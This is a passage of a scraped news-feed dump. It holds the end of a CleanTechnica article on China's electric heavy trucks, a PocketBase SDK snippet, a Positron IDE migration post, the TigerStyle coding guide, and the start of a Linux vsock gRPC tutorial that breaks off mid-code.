    &lt;p&gt;China’s shift away from diesel in the heavy truck segment is dramatic. The country sold more than 900,000 heavy trucks in 2024. Diesel’s share fell to about 57% that year. Natural gas trucks rose to around 29%. Battery electric trucks reached 13%. Early 2025 data points to battery electric share rising again to about 22% of new heavy truck sales, with diesel falling close to the 50% mark. These shifts are large movements inside a very conservative sector. Natural gas trucks saw a rapid rise between 2022 and 2024 as operators chased lower fuel prices and simpler emissions compliance, but the price war in battery electric trucks has made electric freight attractive for many of the same operators. Gas trucks still fill some niches, but the pattern suggests that they may face the same pressure that diesel trucks face. Electric trucks with low running costs and high cycle life begin to look compelling to operators once the purchase price falls into a familiar range.&lt;/p&gt;
    &lt;p&gt;Western OEMs entered China with hopes of capturing a share of the largest truck market in the world, but the results have been mixed. Joint ventures like Foton Daimler once offered a bridge into domestic heavy trucking, yet the rapid rise of low cost local manufacturers in both diesel and electric segments has eroded that position. Western models arrived with higher prices and platforms optimized for different regulations and freight conditions. As domestic OEMs expanded capacity and cut costs, the market shifted toward local brands in every drivetrain category. The impact is clear. Western firms now face reduced market share, weaker margins and strategic uncertainty about long term participation in China’s truck sector.&lt;/p&gt;
    &lt;p&gt;Underlying these drivetrain transitions is a heavy truck market that is smaller and more complicated than it was five years ago. The peak in 2020, with roughly 1.6 million heavy trucks sold, was not a normal year. It was driven by a large regulatory pre-buy that pulled forward sales before tighter emissions rules arrived. The freight economy was also stronger at that time and the construction sector had not yet entered its recent slowdown. As those drivers faded, the market returned to what looks like a long term equilibrium between 800,000 and one million trucks per year. Several confounding factors overlap in this period. Freight volumes shifted. Rail took a larger share of bulk transport as China achieved what North America and Europe have only talked about, mode shifting. Replacement cycles grew longer. Real estate and construction slowed. Diesel’s loss of share is partly driven by these economic factors and partly driven by the arrival of cheaper alternatives. It is difficult to separate the exact contribution of each. The net result is a natural market size that is much lower than the 2020 peak and a much more competitive fight inside the remaining market.&lt;/p&gt;
    &lt;p&gt;Hydrogen heavy truck sales in China show a pattern of stalling growth followed by early signs of decline in 2025. Registration data and industry reports indicate that fuel cell heavy trucks were less than 1% of the heavy truck market in 2024, amounting to low single digit thousands of vehicles, and most of these were tied to provincial demonstration subsidies rather than broad fleet adoption. In the first half of 2025 the number of registered hydrogen trucks rose slightly on paper, but analysts inside China noted that real world operation rates were low and that several local programs were winding down as subsidies tightened. At the same time battery electric heavy trucks climbed from 13% of new sales in 2024 to 22% in early 2025. Hydrogen heavy trucks are losing ground inside a market that is moving quickly toward lower cost electric models, and operators are stepping away from fuel cell platforms as more credible electric options appear. I didn’t bother to include hydrogen on the truck statistics chart as it’s a rounding error and not increasing.&lt;/p&gt;
    &lt;p&gt;One indicator that connects these pieces is diesel consumption. China’s diesel use dropped by about 11% year over year at one point in 2024, which is not a small shift in a country with heavy commercial transport. Part of the drop was due to economic slowing in trucking dominant sectors, but the rise of LNG trucks and electric trucks also contributed. When a truck that once burned diesel every day is replaced by a gas or battery electric truck, national fuel consumption reacts quickly. The fuel market sees these changes earlier than the headline truck sales numbers because thousands of trucks operating every day create a measurable signal in fuel demand. The data is consistent with a freight system that is changing in composition and technology at a pace that would have seemed unlikely a few years earlier.&lt;/p&gt;
    &lt;p&gt;Western operators have to look at this landscape with practical questions in mind. The leading electric bus manufacturer in Europe is Chinese because it built functional electric buses at lower prices before Western firms did. There is no reason the same pattern will not repeat in trucks. Once the cost of a short haul electric truck falls near the cost of a diesel truck, operators will start to buy them. If the imported option is much cheaper than the domestic option, early fleets will run the numbers and make decisions based on cash flow and reliability. Western OEMs face challenges in this environment because their legacy designs and cost structures are not tuned for the kind of price war that emerged in China. They need to match cost while preserving safety and service expectations, which is difficult while shifting from a century of diesel design to a new electric architecture.&lt;/p&gt;
    &lt;p&gt;Western OEMs entered the electric truck market with the platforms they already understood. Most began by taking a diesel tractor frame, removing the engine and gearbox and adding batteries, motors and the associated power electronics. This approach kept production lines moving and reduced near term engineering risk, but it produced electric trucks that carried the compromises of diesel architecture. Battery boxes hung from ladder frames, wiring loops wound through spaces never designed for high voltage systems and weight distribution was optimized for a drivetrain that no longer existed. Several OEMs even explored hydrogen drivetrains inside the same basic frames, which locked in the limitations of a platform built around an internal combustion engine. The results were heavier trucks with less space for batteries, higher costs and lower overall efficiency.&lt;/p&gt;
    &lt;p&gt;The shift toward purpose built electric tractors is only now underway among the major Western OEMs. Volvo’s FH Electric and FM Electric, Daimler’s eActros 300 and 600, Scania’s new battery electric regional tractor and MAN’s eTruck all represent clean sheet or near clean sheet electric designs with integrated drivetrains and optimized battery packaging. These models move Western OEMs closer to the design philosophy that Chinese manufacturers adopted earlier, where the entire platform is built around the electric driveline from the start.&lt;/p&gt;
    &lt;p&gt;China has moved faster toward battery electric heavy trucks than any other major market. It built supply chains for motors, inverters, LFP cells, structural packs and integrated e-axles. It created standard designs and cut costs through volume. It encouraged competition. It is now exporting electric trucks into Asia, Latin America and Africa. Europe and North America are watching this unfold while debating the right charging standards and duty cycle models. The arrival of low cost electric trucks from China raises uncomfortable questions for Western OEMs and policymakers, but it also provides an opportunity. If freight electrification can happen at one third the expected cost, then the pace of decarbonization can be much faster. The challenge is deciding how to integrate or respond to the cost structure that China has already built.&lt;/p&gt;
    &lt;p&gt;The story of heavy trucking is no longer a slow migration from diesel to a distant alternative. The transition is already underway at scale inside the world’s largest heavy truck market. It does not look like the long haul hydrogen scenario that dominated Western modelling for the last decade. It looks like battery electric trucks built cheaply and deployed quickly into short haul service. The economic logic is straightforward. The operational fit is strong. The supply chain is built. The lesson for Western operators and policymakers is that the cost curve has shifted. The decisions that made sense even in 2024 do not match the realities of 2025. The market is moving toward electric freight because it is becoming cheaper than diesel across the majority of real world duty cycles. From the short haul electric trucks will come the new generation of long haul trucks, as night follows day. The arrival of low cost battery trucks from China marks the beginning of a new phase in freight decarbonization.&lt;/p&gt;
    &lt;p&gt;Sign up for CleanTechnica's Weekly Substack for Zach and Scott's in-depth analyses and high level summaries, sign up for our daily newsletter, and follow us on Google News!&lt;/p&gt;
    &lt;p&gt;Have a tip for CleanTechnica? Want to advertise? Want to suggest a guest for our CleanTech Talk podcast? Contact us here.&lt;/p&gt;
    &lt;p&gt;Sign up for our daily newsletter for 15 new cleantech stories a day. Or sign up for our weekly one on top stories of the week if daily is too frequent.&lt;/p&gt;
    &lt;p&gt;CleanTechnica uses affiliate links. See our policy here.&lt;/p&gt;
    &lt;p&gt;CleanTechnica's Comment Policy&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://cleantechnica.com/2025/11/26/chinas-bev-trucks-and-the-end-of-diesels-dominance/"/><published>2025-11-28T03:40:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075320</id><title>Pocketbase – open-source realtime back end in 1 file</title><updated>2025-11-28T08:15:27.096472+00:00</updated><content>&lt;doc fingerprint="91362922a55dae74"&gt;
  &lt;main&gt;
    &lt;code&gt;// JavaScript SDK
import PocketBase from 'pocketbase';

const pb = new PocketBase('http://127.0.0.1:8090');

...

// list and search for 'example' collection records
const list = await pb.collection('example').getList(1, 100, {
    filter: 'title != "" &amp;amp;&amp;amp; created &amp;gt; "2022-08-01"',
    sort: '-created,title',
});

// or fetch a single 'example' collection record
const record = await pb.collection('example').getOne('RECORD_ID');

// delete a single 'example' collection record
await pb.collection('example').delete('RECORD_ID');

// create a new 'example' collection record
const newRecord = await pb.collection('example').create({
    title: 'Lorem ipsum dolor sit amet',
});

// subscribe to changes in any record from the 'example' collection
pb.collection('example').subscribe('*', function (e) {
    console.log(e.record);
});

// stop listening for changes in the 'example' collection
pb.collection('example').unsubscribe();&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://pocketbase.io/"/><published>2025-11-28T03:45:04+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075462</id><title>Migrating to Positron, a next-generation data science IDE for Python and R</title><updated>2025-11-28T08:15:26.960920+00:00</updated><content>&lt;doc fingerprint="8daf6973e9b8e2c9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Guides for migrating to Positron&lt;/head&gt;
    &lt;p&gt;Since Positron was released from beta, we’ve been working hard to create documentation that could help you, whether you are curious about the IDE or interested in switching. We’ve released two migration guides to help you on your journey, which you can find linked below.&lt;/p&gt;
    &lt;head rend="h2"&gt;Migrating to Positron from VS Code&lt;/head&gt;
    &lt;p&gt;Positron is a next-generation IDE for data science, built by Posit PBC. It’s built on Code OSS, the open-source core of Visual Studio Code, which means that many of the features and keyboard shortcuts you’re familiar with are already in place.&lt;/p&gt;
    &lt;p&gt;However, Positron is specifically designed for data work and includes integrated tools that aren’t available in VS Code by default. These include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A built-in data explorer: This feature gives you a spreadsheet-style view of your dataframes, making it easy to inspect, sort, and filter data.&lt;/item&gt;
      &lt;item&gt;An interactive console and variables pane: Positron lets you execute code interactively and view the variables and objects in your session, similar to a traditional data science IDE.&lt;/item&gt;
      &lt;item&gt;AI assistance: Positron Assistant is a powerful AI tool for data science that can generate and refine code, debug issues, and guide you through exploratory data analysis.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See the VS Code migration guide here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Migrating to Positron from RStudio&lt;/head&gt;
    &lt;p&gt;We anticipate many RStudio users will be curious about Positron. When building Positron, we strived to create a familiar interface while adding extensibility and new features, as well as native support for multiple languages. Positron is designed for data scientists and analysts who work with both R and Python and want a flexible, modern, and powerful IDE.&lt;/p&gt;
    &lt;p&gt;Key features for RStudio users include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Native multi-language support: Positron is a polyglot IDE, designed from the ground up to support both R and Python seamlessly.&lt;/item&gt;
      &lt;item&gt;Familiar interface: We designed Positron with a layout similar to RStudio, so you’ll feel right at home with the editor, console, and file panes. We also offer an option to use your familiar RStudio keyboard shortcuts.&lt;/item&gt;
      &lt;item&gt;Extensibility: Because Positron is built on Code OSS, you can use thousands of extensions from the Open VSX marketplace to customize your IDE and workflow.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See the RStudio migration guide here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Migration walkthroughs in Positron&lt;/head&gt;
    &lt;p&gt;Also, check out our migration walkthroughs in Positron itself; find them by searching “Welcome: Open Walkthrough” in the Command Palette (hit the shortcut Cmd + Shift + P to open the Command Palette), or on the Welcome page when you open Positron:&lt;/p&gt;
    &lt;head rend="h2"&gt;What’s next&lt;/head&gt;
    &lt;p&gt;We’re committed to making your transition as smooth as possible, and we’ll be continuing to add to these migration guides. Look out for guides for Jupyter users and more!&lt;/p&gt;
    &lt;p&gt;We’d love to hear from you. What other guides would you like to see? What features would make your transition easier? Join the conversation in our GitHub Discussions.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://posit.co/blog/positron-migration-guides"/><published>2025-11-28T04:15:34+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075628</id><title>TigerStyle: Coding philosophy focused on safety, performance, dev experience</title><updated>2025-11-28T08:15:26.824198+00:00</updated><content>&lt;doc fingerprint="659e4bba43116a0"&gt;
  &lt;main&gt;
    &lt;p&gt;Version 0.1-dev&lt;/p&gt;
    &lt;p&gt;Tiger Style is a coding philosophy focused on safety, performance, and developer experience. Inspired by the practices of TigerBeetle, it focuses on building robust, efficient, and maintainable software through disciplined engineering.&lt;/p&gt;
    &lt;p&gt;Additional sections: Addendum, Colophon&lt;/p&gt;
    &lt;p&gt;Tiger Style is not just a set of coding standards; it's a practical approach to software development. By prioritizing safety, performance, and developer experience, you create code that is reliable, efficient, and enjoyable to work with.&lt;/p&gt;
    &lt;p&gt;Safety is the foundation of Tiger Style. It means writing code that works in all situations and reduces the risk of errors. Focusing on safety makes your software reliable and trustworthy.&lt;/p&gt;
    &lt;p&gt;Performance is about using resources efficiently to deliver fast, responsive software. Prioritizing performance early helps you design systems that meet or exceed user expectations.&lt;/p&gt;
    &lt;p&gt;A good developer experience improves code quality and maintainability. Readable and easy-to-work-with code encourages collaboration and reduces errors, leading to a healthier codebase that stands the test of time [1].&lt;/p&gt;
    &lt;p&gt;The design goals focus on building software that is safe, fast, and easy to maintain.&lt;/p&gt;
    &lt;p&gt;Safety in coding relies on clear, structured practices that prevent errors and strengthen the codebase. It's about writing code that works in all situations and catches problems early. By focusing on safety, you create reliable software that behaves predictably no matter where it runs.&lt;/p&gt;
    &lt;p&gt;Predictable control flow and bounded system resources are essential for safe execution.&lt;/p&gt;
    &lt;p&gt;Simple and explicit control flow: Favor straightforward control structures over complex logic. Simple control flow makes code easier to understand and reduces the risk of bugs. Avoid recursion if possible to keep execution bounded and predictable, preventing stack overflows and uncontrolled resource use.&lt;/p&gt;
    &lt;p&gt;Set fixed limits: Set explicit upper bounds on loops, queues, and other data structures. Fixed limits prevent infinite loops and uncontrolled resource use, following the fail-fast principle. This approach helps catch issues early and keeps the system stable.&lt;/p&gt;
    &lt;p&gt;Limit function length: Keep functions concise, ideally under 70 lines. Shorter functions are easier to understand, test, and debug. They promote single responsibility, where each function does one thing well, leading to a more modular and maintainable codebase.&lt;/p&gt;
    &lt;p&gt;Centralize control flow: Keep switch or if statements in the main parent function, and move non-branching logic to helper functions. Let the parent function manage state, using helpers to calculate changes without directly applying them. Keep leaf functions pure and focused on specific computations. This divides responsibility: one function controls flow, others handle specific logic.&lt;/p&gt;
    &lt;p&gt;Clear and consistent handling of memory and types is key to writing safe, portable code.&lt;/p&gt;
    &lt;p&gt; Use explicitly sized types: Use data types with explicit sizes, like &lt;code&gt;u32&lt;/code&gt; or &lt;code&gt;i64&lt;/code&gt;, instead
					of architecture-dependent types like &lt;code&gt;usize&lt;/code&gt;. This keeps
					behavior consistent across platforms and avoids size-related errors,
					improving portability and reliability.
				&lt;/p&gt;
    &lt;p&gt;Static memory allocation: Allocate all necessary memory during startup and avoid dynamic memory allocation after initialization. Dynamic allocation at runtime can cause unpredictable behavior, fragmentation, and memory leaks. Static allocation makes memory management simpler and more predictable.&lt;/p&gt;
    &lt;p&gt;Minimize variable scope: Declare variables in the smallest possible scope. Limiting scope reduces the risk of unintended interactions and misuse. It also makes the code more readable and easier to maintain by keeping variables within their relevant context.&lt;/p&gt;
    &lt;p&gt;Correct error handling keeps the system robust and reliable in all conditions.&lt;/p&gt;
    &lt;p&gt;Use assertions: Use assertions to verify that conditions hold true at specific points in the code. Assertions work as internal checks, increase robustness, and simplify debugging.&lt;/p&gt;
    &lt;p&gt;Handle all errors: Check and handle every error. Ignoring errors can lead to undefined behavior, security issues, or crashes. Write thorough tests for error-handling code to make sure your application works correctly in all cases.&lt;/p&gt;
    &lt;p&gt;Treat compiler warnings as errors: Use the strictest compiler settings and treat all warnings as errors. Warnings often point to potential issues that could cause bugs. Fixing them right away improves code quality and reliability.&lt;/p&gt;
    &lt;p&gt;Avoid implicit defaults: Explicitly specify options when calling library functions instead of relying on defaults. Implicit defaults can change between library versions or across environments, causing inconsistent behavior. Being explicit improves code clarity and stability.&lt;/p&gt;
    &lt;p&gt;Performance is about using resources efficiently to deliver fast, responsive software. Prioritizing performance early helps design systems that meet or exceed user expectations without unnecessary overhead.&lt;/p&gt;
    &lt;p&gt;Early design decisions have a significant impact on performance. Thoughtful planning helps avoid bottlenecks later.&lt;/p&gt;
    &lt;p&gt;Design for performance early: Consider performance during the initial design phase. Early architectural decisions have a big impact on overall performance, and planning ahead ensures you can avoid bottlenecks and improve resource efficiency.&lt;/p&gt;
    &lt;p&gt;Napkin math: Use quick, back-of-the-envelope calculations to estimate system performance and resource costs. For example, estimate how long it takes to read 1 GB of data from memory or what the expected storage cost will be for logging 100,000 requests per second. This helps set practical expectations early and identify potential bottlenecks before they occur.&lt;/p&gt;
    &lt;p&gt;Batch operations: Amortize expensive operations by processing multiple items together. Batching reduces overhead per item, increases throughput, and is especially useful for I/O-bound operations.&lt;/p&gt;
    &lt;p&gt;Focus on optimizing the slowest resources, typically in this order:&lt;/p&gt;
    &lt;p&gt;Writing predictable code improves performance by reducing CPU cache misses and optimizing branch prediction.&lt;/p&gt;
    &lt;p&gt;Ensure predictability: Write code with predictable execution paths. Predictable code uses CPU caching and branch prediction better, leading to improved performance. Avoid patterns that cause frequent cache misses or unpredictable branching, as they degrade performance.&lt;/p&gt;
    &lt;p&gt;Reduce compiler dependence: Don't rely solely on compiler optimizations for performance. Write clear, efficient code that doesn't depend on compiler behavior. Be explicit in performance-critical sections to ensure consistent results across compilers.&lt;/p&gt;
    &lt;p&gt;Improving the developer experience creates a more maintainable and collaborative codebase.&lt;/p&gt;
    &lt;p&gt;Get the nouns and verbs right. Great names capture what something is or does and create a clear, intuitive model. They show you understand the domain. Take time to find good names, where nouns and verbs fit together, making the whole greater than the sum of its parts.&lt;/p&gt;
    &lt;p&gt; Clear and consistent naming: Use descriptive and meaningful names for variables, functions, and files. Good naming improves code readability and helps others understand each component's purpose. Stick to a consistent style, like &lt;code&gt;snake_case&lt;/code&gt;, throughout the codebase.
				&lt;/p&gt;
    &lt;p&gt; Avoid abbreviations: Use full words in names unless the abbreviation is widely accepted and clear (e.g., &lt;code&gt;ID&lt;/code&gt;, &lt;code&gt;URL&lt;/code&gt;). Abbreviations can be confusing
					and make it harder for others, especially new contributors, to
					understand the code.
				&lt;/p&gt;
    &lt;p&gt; Include units or qualifiers in names: Append units or qualifiers to variable names, placing them in descending order of significance (e.g., &lt;code&gt;latency_ms_max&lt;/code&gt; instead of
					&lt;code&gt;max_latency_ms&lt;/code&gt;). This clears up meaning, avoids
					confusion, and ensures related variables, like
					&lt;code&gt;latency_ms_min&lt;/code&gt;, line up logically and group together.
				&lt;/p&gt;
    &lt;p&gt;Document the 'why': Use comments to explain why decisions were made, not just what the code does. Knowing the intent helps others maintain and extend the code properly. Give context for complex algorithms, unusual approaches, or key constraints.&lt;/p&gt;
    &lt;p&gt;Use proper comment style: Write comments as complete sentences with correct punctuation and grammar. Clear, professional comments improve readability and show attention to detail. They help create a cleaner, more maintainable codebase.&lt;/p&gt;
    &lt;p&gt;Organizing code well makes it easy to navigate, maintain, and extend. A logical structure reduces cognitive load, letting developers focus on solving problems instead of figuring out the code. Group related elements, and simplify interfaces to keep the codebase clean, scalable, and manageable as complexity grows.&lt;/p&gt;
    &lt;p&gt;Organize code logically: Structure your code logically. Group related functions and classes together. Order code naturally, placing high-level abstractions before low-level details. Logical organization makes code easier to navigate and understand.&lt;/p&gt;
    &lt;p&gt;Simplify function signatures: Keep function interfaces simple. Limit parameters, and prefer returning simple types. Simple interfaces reduce cognitive load, making functions easier to understand and use correctly.&lt;/p&gt;
    &lt;p&gt;Construct objects in-place: Initialize large structures or objects directly where they are declared. In-place construction avoids unnecessary copying or moving of data, improving performance and reducing the potential for lifecycle errors.&lt;/p&gt;
    &lt;p&gt;Minimize variable scope: Declare variables close to their usage and within the smallest necessary scope. This reduces the risk of misuse and makes code easier to read and maintain.&lt;/p&gt;
    &lt;p&gt;Maintaining consistency in your code helps reduce errors and creates a stable foundation for the rest of the system.&lt;/p&gt;
    &lt;p&gt;Avoid duplicates and aliases: Prevent inconsistencies by avoiding duplicated variables or unnecessary aliases. When two variables represent the same data, there's a higher chance they fall out of sync. Use references or pointers to maintain a single source of truth.&lt;/p&gt;
    &lt;p&gt;Pass large objects by reference: If a function's argument is larger than 16 bytes, pass it as a reference instead of by value to avoid unnecessary copying. This can catch bugs early where unintended copies may occur.&lt;/p&gt;
    &lt;p&gt; Minimize dimensionality: Keep function signatures and return types simple to reduce the number of cases a developer has to handle. For example, prefer &lt;code&gt;void&lt;/code&gt; over
					&lt;code&gt;bool&lt;/code&gt;, &lt;code&gt;bool&lt;/code&gt; over &lt;code&gt;u64&lt;/code&gt;, and so
					on, when it suits the function's purpose.
				&lt;/p&gt;
    &lt;p&gt;Handle buffer allocation cleanly: When working with buffers, allocate them close to where they are used and ensure all corresponding cleanup happens in the same logical block. Group resource allocation and deallocation with clear newlines to make leaks easier to identify.&lt;/p&gt;
    &lt;p&gt; Off-by-one errors often result from casual interactions between an &lt;code&gt;index&lt;/code&gt;, a &lt;code&gt;count&lt;/code&gt;, or a &lt;code&gt;size&lt;/code&gt;. Treat
			these as distinct types, and apply clear rules when converting between
			them.
		&lt;/p&gt;
    &lt;p&gt;Indexes, counts, and sizes: Indexes are 0-based, counts are 1-based, and sizes represent total memory usage. When converting between them, add or multiply accordingly. Use meaningful names with units or qualifiers to avoid confusion. See&lt;/p&gt;
    &lt;p&gt;Handle division intentionally: When dividing, make your intent clear by specifying how rounding should be handled in edge cases. Use functions or operators designed for exact division, floor division, or ceiling division. This avoids ambiguity and ensures the result behaves as expected.&lt;/p&gt;
    &lt;p&gt;Consistency in code style and tools improves readability, reduces mental load, and makes working together easier.&lt;/p&gt;
    &lt;p&gt;Maintain consistent indentation: Use a uniform indentation style across the codebase. For example, using 4 spaces for indentation provides better visual clarity, especially in complex structures.&lt;/p&gt;
    &lt;p&gt;Limit line lengths: Keep lines within a reasonable length (e.g., 100 characters) to ensure readability. This prevents horizontal scrolling and helps maintain an accessible code layout.&lt;/p&gt;
    &lt;p&gt;Use clear code blocks: Structure code clearly by separating blocks (e.g., control structures, loops, function definitions) to make it easy to follow. Avoid placing multiple statements on a single line, even if allowed. Consistent block structures prevent subtle logic errors and make code easier to maintain.&lt;/p&gt;
    &lt;p&gt;Minimize external dependencies: Reducing external dependencies simplifies the build process and improves security management. Fewer dependencies lower the risk of supply chain attacks, minimize performance issues, and speed up installation.&lt;/p&gt;
    &lt;p&gt;Standardize tooling: Using a small, standardized set of tools simplifies the development environment and reduces accidental complexity. Choose cross-platform tools where possible to avoid platform-specific issues and improve portability across systems.&lt;/p&gt;
    &lt;p&gt;While Tiger Style focuses on the core principles of safety, performance, and developer experience, these are reinforced by an underlying commitment to zero technical debt.&lt;/p&gt;
    &lt;p&gt;A zero technical debt policy is key to maintaining a healthy codebase and ensuring long-term productivity. Addressing potential issues proactively and building robust solutions from the start helps avoid debt that would slow future development.&lt;/p&gt;
    &lt;p&gt;Do it right the first time: Take the time to design and implement solutions correctly from the start. Rushed features lead to technical debt that requires costly refactoring later.&lt;/p&gt;
    &lt;p&gt;Be proactive in problem-solving: Anticipate potential issues and fix them before they escalate. Early detection saves time and resources, preventing performance bottlenecks and architectural flaws.&lt;/p&gt;
    &lt;p&gt;Build momentum: Delivering solid, reliable code builds confidence and enables faster development cycles. High-quality work supports innovation and reduces the need for future rewrites.&lt;/p&gt;
    &lt;p&gt;Avoiding technical debt ensures that progress is true progress—solid, reliable, and built to last.&lt;/p&gt;
    &lt;p&gt;You should think about performance early in design. Napkin math is a helpful tool for this.&lt;/p&gt;
    &lt;p&gt;Napkin math uses simple calculations and rounded numbers to quickly estimate system performance and resource needs.&lt;/p&gt;
    &lt;p&gt;For example, if you're designing a system to store logs, you can estimate storage costs like this:&lt;/p&gt;
    &lt;code&gt;
				 
1. Estimate log volume:
   Assume 1,000 requests per second (RPS)
   Each log entry is about 1 KB

2. Calculate daily log volume:
   1,000 RPS * 86,400 seconds/day * 1 KB ≈ 86,400,000 KB/day ≈ 86.4 GB/day

3. Estimate monthly storage:
   86.4 GB/day * 30 days ≈ 2,592 GB/month

4. Estimate cost (using $0.02 per GB for blob storage):
   2,592 GB * 1000 GB/TB * $0.02/GB ≈ $51 per month
			&lt;/code&gt;
    &lt;p&gt;This gives you a rough idea of monthly storage costs. It helps you check if your logging plan works. The idea is to get within 10x of the right answer.&lt;/p&gt;
    &lt;p&gt;For more, see Simon Eskildsen's napkin math project.&lt;/p&gt;
    &lt;p&gt;This document is a "remix" inspired by the original Tiger Style guide from the TigerBeetle project. In the spirit of Remix Culture, parts of this document are verbatim copies of the original work, while other sections have been rewritten or adapted to fit the goals of this version. This remix builds upon the principles outlined in the original document with a more general approach.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://tigerstyle.dev/"/><published>2025-11-28T04:53:07+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075746</id><title>How to use Linux vsock for fast VM communication</title><updated>2025-11-28T08:15:26.540259+00:00</updated><content>&lt;doc fingerprint="8f8d591d4d436ea4"&gt;
  &lt;main&gt;
    &lt;p&gt;I’ve recently been experimenting with various ways to construct Linux VM images, but for these images to be practical, they need to interact with the outside world. At a minimum, they need to communicate with the host machine.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;vsock&lt;/code&gt; is a technology specifically designed with VMs in mind. It eliminates the need for a TCP/IP stack or network virtualization to enable communication with or between VMs. At the API level, it behaves like a standard socket but utilizes a specialized addressing scheme.&lt;/p&gt;
    &lt;p&gt;In the experiment below, we’ll explore using &lt;code&gt;vsock&lt;/code&gt; as the transport mechanism for a gRPC service running on a VM. We’ll build this project with Bazel for easy reproducibility. Check out this post if you need an intro to Bazel.&lt;/p&gt;
    &lt;head rend="h2"&gt;Table of contents&lt;/head&gt;
    &lt;head&gt;Open Table of contents&lt;/head&gt;
    &lt;head rend="h2"&gt;Motivation&lt;/head&gt;
    &lt;p&gt;There are many use cases for efficient communication between a VM and its host (or between multiple VMs). One simple reason is to create a hermetic environment within the VM and issue commands via RPC from the host. This is the primary driver for using gRPC in this example, but you can easily generalize the approach shown here to build far more complex systems.&lt;/p&gt;
    &lt;head rend="h2"&gt;GitHub repo&lt;/head&gt;
    &lt;p&gt;The complete repository is hosted here and serves as the source of truth for this experiment. While there may be minor inconsistencies between the code blocks below and the repository, please rely on GitHub as the definitive source.&lt;/p&gt;
    &lt;head rend="h2"&gt;Code breakdown&lt;/head&gt;
    &lt;p&gt;Let’s break down the code step by step:&lt;/p&gt;
    &lt;head rend="h3"&gt;External dependencies&lt;/head&gt;
    &lt;p&gt;Here are the external dependencies listed as Bazel modules:&lt;/p&gt;
    &lt;code&gt;bazel_dep(name = "rules_proto", version = "7.1.0")
bazel_dep(name = "rules_cc", version = "0.2.14")
bazel_dep(name = "protobuf", version = "33.1", repo_name = "com_google_protobuf")
bazel_dep(name = "grpc", version = "1.76.0.bcr.1")&lt;/code&gt;
    &lt;p&gt;This is largely self-explanatory. The &lt;code&gt;protobuf&lt;/code&gt; repository is used for C++ proto-generation rules, and &lt;code&gt;grpc&lt;/code&gt; provides the monorepo for Bazel rules to generate gRPC code for the C++ family of languages.&lt;/p&gt;
    &lt;head rend="h3"&gt;gRPC library generation&lt;/head&gt;
    &lt;p&gt;The following Bazel targets generate the necessary C++ Protobuf and gRPC libraries:&lt;/p&gt;
    &lt;code&gt;load("@rules_proto//proto:defs.bzl", "proto_library")
load("@com_google_protobuf//bazel:cc_proto_library.bzl", "cc_proto_library")
load("@grpc//bazel:cc_grpc_library.bzl", "cc_grpc_library")

proto_library(
    name = "vsock_service_proto",
    srcs = ["vsock_service.proto"],
)

cc_proto_library(
    name = "vsock_service_cc_proto",
    deps = [
        ":vsock_service_proto",
    ],
    visibility = [
        "//server:__subpackages__",
        "//client:__subpackages__",
    ],
)

cc_grpc_library(
    name = "vsock_service_cc_grpc",
    grpc_only = True,
    srcs = [
        ":vsock_service_proto",
    ],
    deps = [
        ":vsock_service_cc_proto",
    ],
    visibility = [
        "//server:__subpackages__",
        "//client:__subpackages__",
    ],
)&lt;/code&gt;
    &lt;p&gt;The protocol definition is straightforward:&lt;/p&gt;
    &lt;code&gt;syntax = "proto3";

package popovicu_vsock;

service VsockService {
  rpc Addition(AdditionRequest) returns (AdditionResponse) {}
}

message AdditionRequest {
  int32 a = 1;
  int32 b = 2;
}

message AdditionResponse {
  int32 c = 1;
}&lt;/code&gt;
    &lt;p&gt;It simply exposes a service capable of adding two integers.&lt;/p&gt;
    &lt;head rend="h3"&gt;Server implementation&lt;/head&gt;
    &lt;p&gt;The &lt;code&gt;BUILD&lt;/code&gt; file is straightforward:&lt;/p&gt;
    &lt;code&gt;load("@rules_cc//cc:defs.bzl", "cc_binary")

cc_binary(
    name = "server",
    srcs = [
        "server.cc",
    ],
    deps = [
        "@grpc//:grpc++",
        "//proto:vsock_service_cc_grpc",
        "//proto:vsock_service_cc_proto",
    ],
    linkstatic = True,
    linkopts = [
        "-static",
    ],
)&lt;/code&gt;
    &lt;p&gt;We want a statically linked binary to run on the VM. This choice simplifies deployment, allowing us to drop a single file onto the VM.&lt;/p&gt;
    &lt;p&gt;The code is largely self-explanatory:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;memory&amp;gt;
#include &amp;lt;string&amp;gt;

#include &amp;lt;grpc++/grpc++.h&amp;gt;
#include "proto/vsock_service.grpc.pb.h"

using grpc::Server;
using grpc::ServerBuilder;
using grpc::ServerContext;
using grpc::Status;
using popovicu_vsock::VsockService;
using popovicu_vsock::AdditionRequest;
using popovicu_vsock::AdditionResponse;

// Service implementation
class VsockServiceImpl final : public VsockService::Service {
  Status Addition(ServerContext* context, const AdditionRequest* request,
                  AdditionResponse* response) override {
    int32_t result = request-&amp;gt;a() + request-&amp;gt;b();
    response-&amp;gt;set_c(result);
    std::cout &amp;lt;&amp;lt; "Addition: " &amp;lt;&amp;lt; request-&amp;gt;a() &amp;lt;&amp;lt; " + " &amp;lt;&amp;lt; request-&amp;gt;b()
              &amp;lt;&amp;lt; " = " &amp;lt;&amp;lt; result &amp;lt;&amp;lt; std::endl;
    return Status::OK;
  }
};

void RunServer() {
  // Server running on VM (guest)
  // vsock:-1:9999 means listen on port 9999, accept connections from any CID
  // CID -1 (VMADDR_CID_ANY) allows the host to connect to this VM server
  std::string server_address("vsock:3:9999");
  VsockServiceImpl service;

  ServerBuilder builder;
